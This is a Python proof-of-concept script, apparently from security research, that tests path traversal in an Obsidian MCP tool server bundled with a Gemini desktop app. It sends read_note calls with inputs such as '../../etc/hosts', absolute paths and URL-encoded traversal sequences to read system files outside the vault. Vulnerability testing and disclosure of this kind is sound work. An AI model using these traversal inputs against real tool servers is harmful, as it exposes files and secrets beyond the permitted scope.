#!/usr/bin/env python3
"""PoC: obsidian_mcp_server (Gemini app bundled helper) path traversal tests.
All against a researcher-owned fake vault in /tmp. Harmless target files only
(/etc/hosts, /etc/passwd on own machine).
"""
import subprocess, json, time, os

BIN = "/Applications/Gemini.app/Contents/Helpers/obsidian_mcp_server"
VAULT = "/tmp/obsidian_vault"

# setup fake vault
os.makedirs(f"{VAULT}/notes", exist_ok=True)
with open(f"{VAULT}/notes/hello.md", "w") as f:
    f.write("# hello\nvault note content\n")

proc = subprocess.Popen([BIN], stdin=subprocess.PIPE, stdout=subprocess.PIPE,
                        stderr=subprocess.PIPE, text=True)
_id = [0]

def send(method, params=None, notify=False):
    obj = {"jsonrpc": "2.0", "method": method}
    if not notify:
        _id[0] += 1
        obj["id"] = _id[0]
        if params: obj["params"] = params
    proc.stdin.write(json.dumps(obj) + '\n')
    proc.stdin.flush()

def read_msg(timeout=25):
    start = time.time()
    while time.time() - start < timeout:
        line = proc.stdout.readline()
        if line.strip():
            return json.loads(line)
    return None

send("initialize", {"protocolVersion": "2025-06-18", "capabilities": {},
                     "clientInfo": {"name": "poc", "version": "1.0"}})
r = read_msg()
print("init:", r.get("result", {}).get("serverInfo", r) if r else "FAIL")
send("notifications/initialized", notify=True)

send("tools/list")
r = read_msg()
tools = [t["name"] for t in r["result"]["tools"]] if r and "result" in r else []
print("TOOLS:", tools)

def call(name, args, timeout=30):
    send("tools/call", {"name": name, "arguments": args})
    return read_msg(timeout)

def text_of(resp):
    try:
        return " ".join(p.get("text", "") for p in resp["result"]["content"])[:350]
    except Exception:
        return json.dumps(resp)[:350]

print("\n=== TEST A: baseline read inside vault ===")
resp = call("read_note", {"vault_path": VAULT, "note_path": "notes/hello.md"})
print(text_of(resp))

print("\n=== TEST B: traversal read ../../etc/hosts ===")
resp = call("read_note", {"vault_path": VAULT, "note_path": "../../etc/hosts"})
print(text_of(resp))

print("\n=== TEST C: traversal with absolute path ===")
resp = call("read_note", {"vault_path": VAULT, "note_path": "/etc/hosts"})
print(text_of(resp))

print("\n=== TEST D: encoded traversal (%2e%2e%2f) ===")
resp = call("read_note", {"vault_path": VAULT, "note_path": "..%2f..%2fetc%2fhosts"})
print(text_of(resp))

print("\n=== TEST E: search tool traversal ===")
resp = call("search_notes", {"vault_path": VAULT, "query": "localhost"})
print(text_of(resp))

proc.kill()
